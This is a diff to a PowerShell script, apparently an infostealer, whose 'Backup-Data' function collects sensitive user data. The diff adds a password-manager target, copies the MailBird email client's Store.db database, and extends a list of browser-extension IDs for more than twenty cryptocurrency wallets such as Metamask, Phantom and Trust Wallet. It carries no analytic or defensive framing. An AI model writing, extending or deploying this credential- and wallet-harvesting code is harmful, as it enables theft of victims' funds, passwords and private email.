@@ -190,7 +190,7 @@ function Backup-Data {
     $ftp_clients = "$folderformat\FTP Clients"
     $password_managers = "$folderformat\Password Managers" 
 
-    $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data, $ftp_clients)
+    $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data, $ftp_clients, $password_managers)
     foreach ($folder in $folders) { if (Test-Path $folder) { Remove-Item $folder -Recurse -Force } }
     $folders | ForEach-Object {
         New-Item -ItemType Directory -Path $_ -Force | Out-Null
@@ -693,6 +693,16 @@ function Backup-Data {
       }
     }
     thunderbirdbackup
+	
+    # MailBird
+    function mailbird_backup {
+        $mailbird_folder = "$env:localappdata\MailBird"
+        if (!(Test-Path $mailbird_folder)) { return }
+        $mailbird_db = "$folder_email\MailBird"
+        New-Item -ItemType Directory -Force -Path $mailbird_db | Out-Null
+        Copy-Item -Path "$mailbird_folder\Store\Store.db" -Destination $mailbird_db -Recurse -force
+    } 
+    mailbird_backup
 
     # FTP Clients 
 
@@ -923,22 +933,31 @@ function Backup-Data {
         "Yandex"       = Join-Path $env:LOCALAPPDATA "Yandex\YandexBrowser\User Data"
     }
     $walletDirs = @{
-        "nkbihfbeogaeaoehlefnkodbefgpgknn" = "Metamask"
-    	"ejbalbakoplchlghecdalmeeeajnimhm" = "Metamask2"
-    	"odbfpeeihdkbihmopkbjmoonfanlbfcl" = "Coinbase"
+        "dlcobpjiigpikoobohmabehhmhfoodbb" = "Argent X"
+        "fhbohimaelbohpjbbldcngcnapndodjp" = "Binance Chain Wallet"
+        "jiidiaalihmmhddjgbnbgdfflelocpak" = "BitKeep Wallet"
+        "bopcbmipnjdcdfflfgjdgdjejmgpoaab" = "BlockWallet"
+        "odbfpeeihdkbihmopkbjmoonfanlbfcl" = "Coinbase"
         "hifafgmccdpekplomjjkcfgodnhcellj" = "Crypto.com"
-    	"aholpfdialjgjfhomihkjbmgjidlcdno" = "ExodusWeb3"
+        "kkpllkodjeloidieedojogacfhpaihoh" = "Enkrypt"
         "mcbigmjiafegjnnogedioegffbooigli" = "Ethos Sui"
-    	"hpglfhgfnhbgpjdenjgmdgoeiappafln" = "Guarda"
+        "aholpfdialjgjfhomihkjbmgjidlcdno" = "ExodusWeb3"
+        "hpglfhgfnhbgpjdenjgmdgoeiappafln" = "Guarda"
         "dmkamcknogkgcdfhhbddcghachkejeap" = "Keplr"
+        "afbcbjpbpfadlkmhmclhkeeodmamcflc" = "MathWallet"
+        "nkbihfbeogaeaoehlefnkodbefgpgknn" = "Metamask"
+        "ejbalbakoplchlghecdalmeeeajnimhm" = "Metamask2"
         "mcohilncbfahbmgdjkbpemcciiolgcge" = "OKX"
         "jnmbobjmhlngoefaiojfljckilhhlhcj" = "OneKey"
         "bfnaelmomeimhlpmgjnjophhpkkoljpa" = "Phantom"
         "fnjhmkhhmkbjkkabndcnnogagogbneec" = "Ronin"
         "lgmpcpglpngdoalbgeoldeajfclnhafa" = "SafePal"
-        "egjidjbpglichdcondbcbdnbeeppgdph" = "Trust Wallet"
-        "ibnejdfjmmkpcnlpebklmnkoeoihofec" = "TronLink"
+        "mfgccjchihfkkindfppnaooecgfneiii" = "TokenPocket"
         "nphplpgoakhhjchkkhmiggakijnkhfnd" = "Ton"
+        "ibnejdfjmmkpcnlpebklmnkoeoihofec" = "TronLink"
+        "egjidjbpglichdcondbcbdnbeeppgdph" = "Trust Wallet"
+        "amkmjjmmflddogmhpjloimipbofnfjih" = "Wombat"
+        "heamnjbnflcikcggoiplibfommfbkjpj" = "Zeal"       
     }
     foreach ($browser in $browserPaths.GetEnumerator()) {
         $browserName = $browser.Key
